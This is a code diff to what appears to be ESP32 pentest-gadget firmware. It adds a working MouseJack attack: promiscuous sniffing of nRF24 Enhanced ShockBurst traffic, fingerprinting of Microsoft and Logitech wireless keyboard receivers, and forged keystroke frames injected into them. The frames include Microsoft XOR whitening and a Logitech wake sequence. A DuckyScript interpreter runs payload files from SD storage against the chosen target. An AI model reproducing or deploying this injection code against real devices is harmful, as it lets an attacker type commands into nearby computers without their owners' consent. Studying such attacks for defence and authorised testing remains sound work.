@@ -11,8 +11,12 @@
 #include "screens/module/ModuleMenuScreen.h"
 #include "ui/actions/ShowStatusAction.h"
 #include "ui/actions/InputTextAction.h"
+#include "ui/actions/InputSelectAction.h"
 #include "ui/views/ProgressView.h"
 #include <esp_random.h>
+
+// DuckyScript payloads live here; created on demand before the picker opens.
+static constexpr const char* kMjDuckyDir = "/unigeek/ducky";
 
 // ══════════════════════════════════════════════════════════════
 // ═══════════════ CHANNEL LISTS (jammer) ═══════════════════
@@ -208,10 +212,21 @@ void NRF24Screen::onItemSelected(uint8_t index) {
   }
 
   if (_state == STATE_MJ_SCAN && _mjCount > 0) {
-    // PRESS on a target — inject text
+    // PRESS on a target — pick an attack: type text, or run a Ducky script.
     if (index < _mjCount) {
-      String text = InputTextAction::popup("Type text");
-      if (text.length() > 0) _injectMjText(index, text);
+      static const InputSelectAction::Option kAttackOpts[] = {
+        {"Inject Text",  "text" },
+        {"Ducky Script", "ducky"},
+      };
+      const char* choice = InputSelectAction::popup("Attack", kAttackOpts, 2);
+      if (choice) {
+        if (strcmp(choice, "text") == 0) {
+          String text = InputTextAction::popup("Type text");
+          if (text.length() > 0) _injectMjText(index, text);
+        } else {
+          _pickDuckyScript(index);
+        }
+      }
       _chromeDrawn = false;
       render();
     }
@@ -569,23 +584,32 @@ void NRF24Screen::_setupMjScan() {
   }
   auto* r = _nrf.radio();
   if (!r) return;
+  // Promiscuous ESB capture: 2-byte "address" of alternating preamble bytes,
+  // CRC off, 2 Mbps, full 32-byte payload. Real packets are recovered and
+  // validated in software by _esbDecode().
   r->setAutoAck(false);
   r->disableCRC();
   r->setAddressWidth(2);
   r->setDataRate(RF24_2MBPS);
   r->setPALevel(RF24_PA_MAX);
-  static const uint8_t promAddr[][2] = {{0xAA,0x00},{0x55,0x00}};
-  r->openReadingPipe(1, promAddr[0]);
-  r->openReadingPipe(2, promAddr[1]);
   r->setPayloadSize(32);
-  r->setChannel(0);
+  r->setRetries(0, 0);
+  r->flush_rx();
+  r->flush_tx();
+  static const uint8_t noiseAddr[][2] = {
+    {0x55,0x55}, {0xAA,0xAA}, {0xA0,0xAA},
+    {0xAB,0xAA}, {0xAC,0xAA}, {0xAD,0xAA}
+  };
+  for (uint8_t i = 0; i < 6; i++) r->openReadingPipe(i, noiseAddr[i]);
+  r->setChannel(2);
   r->startListening();
 
   memset(_mjTargets, 0, sizeof(_mjTargets));
   _mjCount    = 0;
   _mjSelected = 0;
-  _mjScanCh   = 0;
+  _mjScanCh   = 2;
   _mjMsSeq    = 0;
+  _mjHopMs    = millis();
   _lastRender = millis();
   _chromeDrawn = false;
   _state = STATE_MJ_SCAN;
@@ -597,37 +621,97 @@ void NRF24Screen::_setupMjScan() {
 void NRF24Screen::_stepMjScan() {
   auto* r = _nrf.radio();
   if (!r) return;
+
+  // Drain everything queued on the current channel before hopping.
   uint8_t buf[32];
-  if (r->available()) {
+  int guard = 0;
+  while (r->available() && guard++ < 8) {
     r->read(buf, 32);
-    _fingerprintMj(buf, 32, (uint8_t)_mjScanCh);
+    _esbDecode(buf, 32, (uint8_t)_mjScanCh);
   }
-  if (millis() % 4 == 0) {
+
+  // Sweep the ESB range (channels 2-84) with a short dwell per channel.
+  if (millis() - _mjHopMs >= 3) {
+    _mjHopMs = millis();
     r->stopListening();
-    _mjScanCh = (_mjScanCh + 1) % 84;
+    _mjScanCh = (_mjScanCh >= 84) ? 2 : _mjScanCh + 1;
     r->setChannel(_mjScanCh);
     r->startListening();
   }
 }
 
-void NRF24Screen::_fingerprintMj(const uint8_t* buf, uint8_t len, uint8_t ch) {
-  if (len >= 19 && buf[0] == 0x08 && buf[6] == 0x40) {
-    _addMjTarget(buf + 1, 5, ch, 1);
+// CRC16-CCITT, MSB-first, used to validate a decoded ESB packet.
+uint16_t NRF24Screen::_crc16Update(uint16_t crc, uint8_t byte, uint8_t bits) {
+  crc = crc ^ ((uint16_t)byte << 8);
+  while (bits--) {
+    if (crc & 0x8000) crc = (crc << 1) ^ 0x1021;
+    else              crc = crc << 1;
+  }
+  return crc & 0xFFFF;
+}
+
+// Recover a real Enhanced ShockBurst packet from a promiscuous capture. The
+// preamble lock is not byte-aligned, so try the raw buffer and a 1-bit
+// right-shifted copy; accept a candidate only if its CRC16 checks out, then
+// extract the 5-byte address and payload for fingerprinting.
+void NRF24Screen::_esbDecode(const uint8_t* raw, uint8_t size, uint8_t ch) {
+  if (size < 10) return;
+  if (size > 37) size = 37;
+
+  uint8_t buf[37];
+  memcpy(buf, raw, size);
+
+  for (int offset = 0; offset < 2; offset++) {
+    if (offset == 1) {
+      memcpy(buf, raw, size);
+      for (int x = size - 1; x >= 0; x--) {
+        if (x > 0) buf[x] = (buf[x - 1] << 7) | (buf[x] >> 1);
+        else       buf[x] = buf[x] >> 1;
+      }
+    }
+
+    // Payload length lives in the upper 6 bits of the PCF byte.
+    uint8_t payloadLength = buf[5] >> 2;
+    if (payloadLength == 0 || payloadLength > (size - 9)) continue;
+
+    // Extract the transmitted CRC (9-bit-aligned within the byte stream).
+    uint16_t crcGiven = ((uint16_t)buf[6 + payloadLength] << 9) |
+                        ((uint16_t)buf[7 + payloadLength] << 1);
+    crcGiven = (crcGiven << 8) | (crcGiven >> 8);
+    if (buf[8 + payloadLength] & 0x80) crcGiven |= 0x0100;
+
+    uint16_t crcCalc = 0xFFFF;
+    for (int x = 0; x < 6 + payloadLength; x++) crcCalc = _crc16Update(crcCalc, buf[x], 8);
+    crcCalc = _crc16Update(crcCalc, buf[6 + payloadLength] & 0x80, 1);
+    crcCalc = (crcCalc << 8) | (crcCalc >> 8);
+
+    if (crcCalc != crcGiven) continue;
+
+    uint8_t addr[5];
+    memcpy(addr, buf, 5);
+
+    uint8_t esbPayload[32];
+    for (int x = 0; x < payloadLength; x++)
+      esbPayload[x] = ((buf[6 + x] << 1) & 0xFF) | (buf[7 + x] >> 7);
+
+    _fingerprintPayload(esbPayload, payloadLength, addr, ch);
     return;
   }
-  if (len >= 19 && buf[0] == 0x0A) {
-    _addMjTarget(buf + 1, 5, ch, 2);
-    return;
+}
+
+// Classify a decoded ESB payload by its Microsoft / Logitech signature.
+void NRF24Screen::_fingerprintPayload(const uint8_t* payload, uint8_t size,
+                                      const uint8_t* addr, uint8_t ch) {
+  if (size == 19) {
+    if (payload[0] == 0x08 && payload[6] == 0x40) { _addMjTarget(addr, 5, ch, 1); return; }
+    if (payload[0] == 0x0A)                       { _addMjTarget(addr, 5, ch, 2); return; }
   }
-  if (len >= 5 && buf[0] == 0x00) {
-    if (len >= 10 && (buf[1] == 0xC2 || buf[1] == 0x4F)) {
-      _addMjTarget(buf + 2, 5, ch, 3);
-      return;
-    }
-    if (len >= 22 && buf[1] == 0xD3) {
-      _addMjTarget(buf + 2, 5, ch, 3);
-      return;
-    }
+  if (payload[0] == 0x00) {
+    bool isLog = false;
+    if (size == 10 && (payload[1] == 0xC2 || payload[1] == 0x4F)) isLog = true;
+    if (size == 22 && payload[1] == 0xD3)                         isLog = true;
+    if (size == 5  && payload[1] == 0x40)                         isLog = true;
+    if (isLog) { _addMjTarget(addr, 5, ch, 3); return; }
   }
 }
 
@@ -712,84 +796,308 @@ bool NRF24Screen::_asciiToHid(char c, HidKey& out) {
   return out.key != 0;
 }
 
-void NRF24Screen::_msTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
-  auto* r = _nrf.radio();
-  if (!r) return;
-  r->setAutoAck(false);
-  r->disableCRC();
-  r->setAddressWidth(t.addrLen);
-  r->setDataRate(RF24_2MBPS);
-  r->openWritingPipe(t.addr);
-  r->setChannel(t.ch);
-  r->stopListening();
+// ── Tuning ──────────────────────────────────────────────────────
+static constexpr int kMjRetransmits = 5;
+static constexpr int kMjInterKeyMs  = 10;
 
-  // Microsoft HID payload (unencrypted)
-  uint8_t payload[19] = {};
-  payload[0] = 0x08;
-  payload[5] = 0x00;   // sequence
-  payload[6] = 0x40;
-  payload[7] = mod;
-  payload[9] = key;
+// ── DuckyScript key-name table ──────────────────────────────────
+static const struct { const char* name; uint8_t mod; uint8_t key; } kDuckyKeys[] = {
+  {"ENTER",0,0x28},   {"RETURN",0,0x28},  {"ESCAPE",0,0x29},  {"ESC",0,0x29},
+  {"BACKSPACE",0,0x2A},{"TAB",0,0x2B},    {"SPACE",0,0x2C},   {"CAPSLOCK",0,0x39},
+  {"DELETE",0,0x4C},  {"DEL",0,0x4C},     {"INSERT",0,0x49},  {"HOME",0,0x4A},
+  {"END",0,0x4D},     {"PAGEUP",0,0x4B},  {"PAGEDOWN",0,0x4E},
+  {"UP",0,0x52},      {"UPARROW",0,0x52}, {"DOWN",0,0x51},    {"DOWNARROW",0,0x51},
+  {"LEFT",0,0x50},    {"LEFTARROW",0,0x50},{"RIGHT",0,0x4F},  {"RIGHTARROW",0,0x4F},
+  {"PRINTSCREEN",0,0x46},{"SCROLLLOCK",0,0x47},{"PAUSE",0,0x48},{"BREAK",0,0x48},
+  {"F1",0,0x3A},{"F2",0,0x3B},{"F3",0,0x3C},{"F4",0,0x3D},{"F5",0,0x3E},{"F6",0,0x3F},
+  {"F7",0,0x40},{"F8",0,0x41},{"F9",0,0x42},{"F10",0,0x43},{"F11",0,0x44},{"F12",0,0x45},
+  {"CTRL",0x01,0},{"CONTROL",0x01,0},{"SHIFT",0x02,0},{"ALT",0x04,0},
+  {"GUI",0x08,0}, {"WINDOWS",0x08,0},{"WIN",0x08,0}, {"COMMAND",0x08,0},
+  {"MENU",0,0x65},{"APP",0,0x65},
+};
 
-  for (int i = 0; i < 5; i++) {
-    r->writeFast(payload, 19, true);
-    payload[9] = 0; // key up
-    r->writeFast(payload, 19, true);
-    delay(10);
-  }
-  r->flush_tx();
+bool NRF24Screen::_mjAbort() {
+  if (Uni.Nav && Uni.Nav->wasPressed())
+    return Uni.Nav->readDirection() == INavigation::DIR_BACK;
+  return false;
 }
 
-void NRF24Screen::_logTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
+// Switch the radio from promiscuous RX to TX aimed at one target.
+void NRF24Screen::_setupTxForTarget(const MjTarget& t) {
   auto* r = _nrf.radio();
   if (!r) return;
+  r->stopListening();
   r->setAutoAck(false);
   r->disableCRC();
-  r->setAddressWidth(t.addrLen);
   r->setDataRate(RF24_2MBPS);
-  r->openWritingPipe(t.addr);
+  r->setPALevel(RF24_PA_MAX);
+  r->setAddressWidth(5);
   r->setChannel(t.ch);
-  r->stopListening();
+  r->setRetries(0, 0);
+  r->flush_rx();
+  r->flush_tx();
+  r->openWritingPipe(t.addr);
+  r->setPayloadSize((t.type == 3) ? 10 : 19);
+}
 
-  uint8_t payload[10] = {};
-  payload[0] = 0x00;
-  payload[1] = 0xD3;  // Logitech HID keystroke
-  payload[2] = 0x00;
-  payload[3] = mod;
-  payload[4] = 0x00;
-  payload[5] = key;
+void NRF24Screen::_transmitReliable(const uint8_t* frame, uint8_t len) {
+  auto* r = _nrf.radio();
+  if (!r) return;
+  for (int i = 0; i < kMjRetransmits; i++) r->write(frame, len, true); // multicast: no ACK
+}
+
+// Microsoft frame checksum: XOR of all preceding bytes, inverted.
+void NRF24Screen::_msChecksum(uint8_t* payload, uint8_t size) {
+  uint8_t cksum = 0;
+  for (uint8_t i = 0; i < size - 1; i++) cksum ^= payload[i];
+  payload[size - 1] = ~cksum;
+}
+
+// Microsoft "encrypted" whitening: XOR the tail with the device address.
+void NRF24Screen::_msCrypt(uint8_t* payload, uint8_t size, const uint8_t* addr) {
+  for (uint8_t i = 4; i < size; i++) payload[i] ^= addr[(i - 4) % 5];
+}
+
+void NRF24Screen::_msTransmit(const MjTarget& t, uint8_t mod, uint8_t key) {
+  uint8_t frame[19];
+  memset(frame, 0, sizeof(frame));
+  frame[0] = 0x08;
+  frame[4] = (uint8_t)(_mjMsSeq & 0xFF);
+  frame[5] = (uint8_t)((_mjMsSeq >> 8) & 0xFF);
+  frame[6] = 0x43;
+  frame[7] = mod;
+  frame[9] = key;
+  _mjMsSeq++;
+  _msChecksum(frame, sizeof(frame));
+  if (t.type == 2) _msCrypt(frame, sizeof(frame), t.addr);
+
+  // Key-down
+  _transmitReliable(frame, sizeof(frame));
+  delay(5);
+
+  // Key-up (null keystroke) with a fresh sequence number
+  if (t.type == 2) _msCrypt(frame, sizeof(frame), t.addr);
+  for (int n = 4; n < 18; n++) frame[n] = 0;
+  frame[4] = (uint8_t)(_mjMsSeq & 0xFF);
+  frame[5] = (uint8_t)((_mjMsSeq >> 8) & 0xFF);
+  frame[6] = 0x43;
+  _mjMsSeq++;
+  _msChecksum(frame, sizeof(frame));
+  if (t.type == 2) _msCrypt(frame, sizeof(frame), t.addr);
+  _transmitReliable(frame, sizeof(frame));
+  delay(5);
+}
+
+void NRF24Screen::_logTransmit(const MjTarget& t, uint8_t mod, const uint8_t* keys, uint8_t keysLen) {
+  uint8_t frame[10];
+  memset(frame, 0, sizeof(frame));
+  frame[0] = 0x00;
+  frame[1] = 0xC1;   // unencrypted HID keyboard frame
+  frame[2] = mod;
+  for (uint8_t i = 0; i < keysLen && i < 6; i++) frame[3 + i] = keys[i];
 
   // Two's-complement checksum
-  uint8_t ck = 0;
-  for (int i = 0; i < 9; i++) ck += payload[i];
-  payload[9] = (~ck + 1) & 0xFF;
+  uint8_t cksum = 0;
+  for (uint8_t i = 0; i < 9; i++) cksum += frame[i];
+  frame[9] = (uint8_t)(0x100 - cksum);
 
-  for (int i = 0; i < 5; i++) {
-    r->writeFast(payload, 10, true);
-    payload[5] = 0; // key up
-    ck = 0;
-    for (int j = 0; j < 9; j++) ck += payload[j];
-    payload[9] = (~ck + 1) & 0xFF;
-    r->writeFast(payload, 10, true);
-    delay(10);
+  _transmitReliable(frame, sizeof(frame));
+}
+
+// Nudge a sleeping Logitech receiver awake before injecting.
+void NRF24Screen::_logitechWake(const MjTarget& t) {
+  if (t.type != 3) return;
+  uint8_t hello[10] = {0x00, 0x4F, 0x00, 0x04, 0xB0, 0x10, 0x00, 0x00, 0x00, 0xED};
+  _transmitReliable(hello, sizeof(hello));
+  delay(12);
+  uint8_t neutral = 0x00;
+  _logTransmit(t, 0x00, &neutral, 1);
+  delay(8);
+}
+
+void NRF24Screen::_sendKeystroke(const MjTarget& t, uint8_t mod, uint8_t key) {
+  if (t.type == 3) {
+    _logTransmit(t, mod, &key, 1);
+    delay(kMjInterKeyMs);
+    uint8_t none = 0x00;
+    _logTransmit(t, 0x00, &none, 1);
+  } else {
+    _msTransmit(t, mod, key);
   }
-  r->flush_tx();
+}
+
+void NRF24Screen::_typeString(const MjTarget& t, const char* text) {
+  for (size_t i = 0; text[i] != '\0'; i++) {
+    if (_mjAbort()) return;
+    HidKey hk;
+    char c = text[i];
+    if (c == '\n')      { hk.mod = 0; hk.key = 0x28; }   // ENTER
+    else if (c == '\t') { hk.mod = 0; hk.key = 0x2B; }   // TAB
+    else if (!_asciiToHid(c, hk)) continue;
+    _sendKeystroke(t, hk.mod, hk.key);
+    delay(kMjInterKeyMs);
+  }
+}
+
+// Parse one DuckyScript line and execute it against the target.
+bool NRF24Screen::_parseDuckyLine(const String& line, const MjTarget& t) {
+  if (line.startsWith("REM") || line.startsWith("//")) return true;
+
+  if (line.startsWith("DELAY ") || line.startsWith("DELAY\t")) {
+    int ms = line.substring(6).toInt();
+    if (ms > 0 && ms <= 60000) delay(ms);
+    return true;
+  }
+  if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) return true;
+  if (line.startsWith("STRING ")) { _typeString(t, line.substring(7).c_str()); return true; }
+  if (line.startsWith("STRINGLN ")) {
+    _typeString(t, line.substring(9).c_str());
+    _sendKeystroke(t, 0, 0x28);
+    return true;
+  }
+  if (line.startsWith("REPEAT ")) return true;
+
+  // Key names / modifier combos on a single line (e.g. "CTRL ALT DELETE").
+  uint8_t mod = 0, key = 0;
+  String rem = line;
+  rem.trim();
+  while (rem.length() > 0) {
+    int sp = rem.indexOf(' ');
+    String tok;
+    if (sp > 0) { tok = rem.substring(0, sp); rem = rem.substring(sp + 1); rem.trim(); }
+    else        { tok = rem; rem = ""; }
+
+    if (tok.length() == 1) {
+      HidKey hk;
+      if (_asciiToHid(tok.charAt(0), hk)) { mod |= hk.mod; key = hk.key; }
+      continue;
+    }
+    bool found = false;
+    for (const auto& dk : kDuckyKeys) {
+      if (tok.equalsIgnoreCase(dk.name)) {
+        mod |= dk.mod;
+        if (dk.key != 0) key = dk.key;
+        found = true;
+        break;
+      }
+    }
+    if (!found) return false;
+  }
+  _sendKeystroke(t, mod, key);
+  delay(kMjInterKeyMs);
+  return true;
 }
 
 void NRF24Screen::_injectMjText(int targetIdx, const String& text) {
   if (targetIdx < 0 || targetIdx >= (int)_mjCount) return;
-  const MjTarget& t = _mjTargets[targetIdx];
+  MjTarget t = _mjTargets[targetIdx];
   auto* r = _nrf.radio();
   if (!r) return;
-  r->stopListening();
 
-  for (int i = 0; i < (int)text.length(); i++) {
-    char c = text.charAt(i);
-    HidKey hk;
-    if (!_asciiToHid(c, hk)) continue;
-    if (t.type == 3) _logTransmit(t, hk.mod, hk.key);
-    else             _msTransmit(t, hk.mod, hk.key);
-    delay(10);
+  _setupTxForTarget(t);
+  _logitechWake(t);
+  if (t.type == 1 || t.type == 2) {
+    _mjMsSeq = 0;
+    for (int i = 0; i < 6; i++) { _msTransmit(t, 0, 0); delay(2); }
   }
+
+  _typeString(t, text.c_str());
+
+  r->powerDown();
+  ShowStatusAction::show("Injection complete");
   _setupMjScan();
+}
+
+void NRF24Screen::_injectMjDucky(int targetIdx, const String& path) {
+  if (targetIdx < 0 || targetIdx >= (int)_mjCount) return;
+  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
+    ShowStatusAction::show("No storage");
+    return;
+  }
+  MjTarget t = _mjTargets[targetIdx];
+  auto* r = _nrf.radio();
+  if (!r) return;
+
+  fs::File file = Uni.Storage->open(path.c_str(), "r");
+  if (!file) {
+    ShowStatusAction::show("Cannot open file");
+    return;
+  }
+
+  _setupTxForTarget(t);
+  _logitechWake(t);
+  if (t.type == 1 || t.type == 2) {
+    _mjMsSeq = 0;
+    for (int i = 0; i < 6; i++) { _msTransmit(t, 0, 0); delay(2); }
+  }
+
+  uint16_t defaultDelayMs = 0;
+  String lastLine;
+  while (file.available()) {
+    if (_mjAbort()) break;
+    String line = file.readStringUntil('\n');
+    line.trim();
+    if (line.length() == 0) continue;
+
+    if (line.startsWith("DEFAULT_DELAY ") || line.startsWith("DEFAULTDELAY ")) {
+      defaultDelayMs = (uint16_t)line.substring(line.indexOf(' ') + 1).toInt();
+      if (defaultDelayMs > 10000) defaultDelayMs = 10000;
+      continue;
+    }
+    if (line.startsWith("REPEAT ")) {
+      int reps = line.substring(7).toInt();
+      if (reps < 1)   reps = 1;
+      if (reps > 500) reps = 500;
+      for (int rr = 0; rr < reps; rr++) {
+        if (_mjAbort()) break;
+        if (lastLine.length() > 0) _parseDuckyLine(lastLine, t);
+      }
+      continue;
+    }
+
+    _parseDuckyLine(line, t);
+    lastLine = line;
+    if (defaultDelayMs > 0) delay(defaultDelayMs);
+  }
+
+  file.close();
+  r->powerDown();
+  ShowStatusAction::show("Script complete");
+  _setupMjScan();
+}
+
+// Present the DuckyScript files on the SD card and run the chosen one.
+void NRF24Screen::_pickDuckyScript(int targetIdx) {
+  if (!Uni.Storage || !Uni.Storage->isAvailable()) {
+    ShowStatusAction::show("No storage");
+    return;
+  }
+  Uni.Storage->makeDir(kMjDuckyDir);
+
+  static constexpr uint8_t kMax = 24;
+  IStorage::DirEntry entries[kMax];
+  uint8_t n = Uni.Storage->listDir(kMjDuckyDir, entries, kMax);
+
+  String              names[kMax];   // backing storage for option strings
+  InputSelectAction::Option opts[kMax];
+  uint8_t optCount = 0;
+  for (uint8_t i = 0; i < n && optCount < kMax; i++) {
+    if (entries[i].isDir) continue;
+    if (!entries[i].name.endsWith(".txt") && !entries[i].name.endsWith(".dd")) continue;
+    names[optCount]      = entries[i].name;
+    opts[optCount].label = names[optCount].c_str();
+    opts[optCount].value = names[optCount].c_str();
+    optCount++;
+  }
+
+  if (optCount == 0) {
+    ShowStatusAction::show("No scripts in /unigeek/ducky");
+    return;
+  }
+
+  const char* chosen = InputSelectAction::popup("Ducky Script", opts, optCount);
+  if (!chosen) return;
+
+  String path = String(kMjDuckyDir) + "/" + chosen;
+  _injectMjDucky(targetIdx, path);
 }
